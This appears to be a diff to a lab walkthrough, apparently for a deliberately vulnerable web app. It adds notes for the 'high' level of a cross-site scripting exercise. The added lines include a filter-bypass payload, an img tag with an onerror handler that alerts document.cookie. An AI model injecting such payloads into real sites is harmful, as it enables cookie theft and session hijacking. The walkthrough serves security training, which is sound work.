@@ -895,6 +895,12 @@ It will successfully trigger alert pop up with cookie value.
 
 **Security level is currently: high.**
 
+this time script tag is entirely blocked so we use different payload method same as we used in medium.
+
+payload=`<ImG src=x onerror="alert(document.cookie)">`
+
+
+<br/>
 
 ---
 
@@ -903,7 +909,9 @@ It will successfully trigger alert pop up with cookie value.
 
 
 **Security level is currently: low.**
+
 **Security level is currently: medium.**
+
 **Security level is currently: high.**
 
 
